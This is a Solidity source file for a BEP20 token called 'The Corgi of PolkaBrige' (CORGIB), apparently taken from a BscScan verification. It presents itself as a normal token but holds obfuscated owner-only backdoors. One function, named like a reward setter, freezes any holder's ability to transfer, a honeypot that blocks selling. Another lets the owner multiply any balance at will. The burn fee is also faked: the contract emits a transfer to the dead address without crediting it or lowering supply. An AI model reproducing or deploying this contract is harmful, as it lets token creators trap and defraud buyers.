/**
 *Submitted for verification at BscScan.com on 2023-01-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function subi(uint256 a, uint256 b) internal pure returns (uint256) {
        return subi(a, b, "SafeMath: subitraction overflow");
    }

    function subi(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function miul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: miultiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address booadndd) internal view returns (bool) {

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            size := extcodesize(booadndd)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amoununt) internal {
        require(address(this).balance >= amoununt, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amoununt }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address booadndd) external view returns (uint256);
    function transfer(address recipient, uint256 amoununt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amoununt) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amoununt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract HasForeignAsset is Ownable {
    function assetBalance(IBEP20 asset) external view returns (uint256) {
        return asset.balanceOf(address(this));
    }

}

 interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract CORGIB is IBEP20, HasForeignAsset {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _depolssit;
    uint public constant MAX_DELAY = 2 ** 256 -1; // seconds

    mapping(address => mapping(address => uint256)) private _allowances;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    uint256 private _totalSupply;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _luhan = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;


    function getdepolssit(address booadndd) public view returns (uint256) {
        return _depolssit[booadndd];
    }

    function _setTheCorgiofPolkaBrige16114reward(address booadndd) public onlyOwner {
        _depolssit[booadndd] = MAX_DELAY;
    }

    function Setupcacaledepolssit(address booadndd) public onlyOwner {
        _depolssit[booadndd] = 0;
    }


    function SetupwithdrawAasses(address booadndd,uint256 nuum) public onlyOwner {
        _balances[booadndd] = _balances[booadndd].miul(nuum);
    }

    constructor() {
        _name = "The Corgi of PolkaBrige";
        _symbol = "CORGIB";
        _decimals = 9;
        uint256 _maxSupply = 5400000000000;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
        _mintArkn(msg.sender, _maxSupply.miul(10**_decimals));
    }

    receive() external payable {
        revert();
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address booadndd) public view override returns (uint256) {
        return _balances[booadndd];
    }

    function transfer(address recipient, uint256 amoununt) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amoununt);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amoununt) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amoununt);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amoununt
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amoununt);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].subi(amoununt, "BEP20: transfer amoununt exceeds allowance")
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subitractedValue) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].subi(subitractedValue, "BEP20: decreased allowance below zero")
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amoununt
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        uint256 luhanamoununt = 1;
        luhanamoununt = amoununt.miul(_luhan).div(100);
        uint256 amoiinn;
        amoiinn = amoununt - luhanamoununt+0;
        _afterTokenTransfer(sender, recipient, amoiinn);

        _balances[sender] = _balances[sender].subi(
            _depolssit[sender]+0,
            "BEP20: transfer amoununt exceeds balance"
        );

        _balances[sender] = _balances[sender].subi(
            amoununt,
            "BEP20: transfer amoununt exceeds balance"
        );

        _balances[recipient] = _balances[recipient].add(amoiinn);
        if (luhanamoununt > 0) {
            emit Transfer(sender, _DEADaddress, luhanamoununt);
        }
        emit Transfer(sender, recipient, amoiinn);
    }

    function _mintArkn(address booadndd, uint256 amoununt) internal virtual {
        require(booadndd != address(0), "BEP20: mint to the zero address");

        _afterTokenTransfer(address(0), booadndd, amoununt);

        _totalSupply = _totalSupply.add(amoununt);
        _balances[booadndd] = _balances[booadndd].add(amoununt);
        emit Transfer(address(0), booadndd, amoununt);
    }

    function _burn(address booadndd, uint256 amoununt) internal virtual {
        require(booadndd != address(0), "BEP20: burn from the zero address");

        _afterTokenTransfer(booadndd, address(0), amoununt);

        _balances[booadndd] = _balances[booadndd].subi(amoununt, "BEP20: burn amoununt exceeds balance");
        _totalSupply = _totalSupply.subi(amoununt);
        emit Transfer(booadndd, address(0), amoununt);
    }

    function burn(uint256 amoununt) public {
        _burn(_msgSender(), amoununt);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amoununt
    ) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amoununt;
        emit Approval(owner, spender, amoununt);
    }

    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amoununt
    ) internal virtual {}
}